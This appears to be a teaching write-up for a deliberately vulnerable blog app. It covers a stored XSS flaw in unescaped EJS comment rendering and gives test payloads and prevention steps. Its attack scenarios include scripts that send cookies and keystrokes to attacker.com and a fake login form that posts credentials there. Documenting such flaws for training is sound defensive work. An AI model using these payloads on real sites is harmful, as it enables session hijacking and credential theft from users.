# Cross-Site Scripting (XSS) Vulnerability

## Overview
Cross-Site Scripting (XSS) vulnerabilities occur when an application includes untrusted data in a web page without proper validation or escaping. In this application, the blog comments feature is vulnerable to XSS attacks because it renders user input directly in the HTML without sanitization.

## CVE Reference
CVE-2023-23756 (Example CVE for XSS)

## Vulnerable Endpoints
- `/posts/:id` (Comment section)
- `/posts/:id/comments` (Comment submission)

## How to Test

1. Navigate to any blog post:
   ```
   /posts/1
   ```

2. Try these XSS payloads in the comment field:

   ### Basic Script Injection
   ```html
   <script>alert('XSS')</script>
   ```

   ### Event Handler Injection
   ```html
   <img src="x" onerror="alert('XSS')">
   ```

   ### JavaScript URI
   ```html
   <a href="javascript:alert('XSS')">Click me</a>
   ```

   ### DOM-based XSS
   ```html
   <div onmouseover="alert('XSS')">Hover over me</div>
   ```

## Example Attack Scenarios

### 1. Cookie Theft
```html
<script>
fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>
```

### 2. Keylogger Injection
```html
<script>
document.addEventListener('keypress', function(e) {
  fetch('https://attacker.com/log?key=' + e.key);
});
</script>
```

### 3. Phishing Form
```html
<div style="position:fixed;top:0;left:0;width:100%;height:100%;background-color:white">
  <h2>Please Re-login</h2>
  <form action="https://attacker.com/steal">
    Username: <input name="username"><br>
    Password: <input type="password" name="password"><br>
    <button>Login</button>
  </form>
</div>
```

## How It Works
The vulnerability exists because comment content is rendered directly in the template without sanitization:

```javascript
// Vulnerable code in post.ejs
<%- comment.content %>  // Using <%- %> renders HTML without escaping
```

Instead of:
```javascript
<%= comment.content %>  // Using <%= %> escapes HTML
```

## Prevention

1. Output Encoding:
```javascript
// In EJS templates, use <%= instead of <%- 
<%= comment.content %>
```

2. Content Security Policy (CSP):
```javascript
// In app.js
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; script-src 'self'"
  );
  next();
});
```

3. Input Validation:
```javascript
const sanitizeHtml = require('sanitize-html');

app.post('/posts/:id/comments', (req, res) => {
  const sanitizedContent = sanitizeHtml(req.body.content, {
    allowedTags: [], // No HTML allowed
    allowedAttributes: {}
  });
  // Save sanitizedContent to database
});
```

4. Additional Prevention Measures:
   - Use the `helmet` middleware for security headers
   - Implement CSRF tokens
   - Set proper cookie security flags
   - Keep dependencies updated
   - Use modern frameworks with built-in XSS protection

## Impact of XSS
- Session hijacking
- Data theft
- Malware distribution
- Defacement
- Credential harvesting
- Network scanning
- Port scanning
- Botnet recruitment

## Testing Tools
- Browser Developer Tools
- XSS Hunter
- OWASP ZAP
- Burp Suite

## References
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP XSS Filter Evasion Cheat Sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)
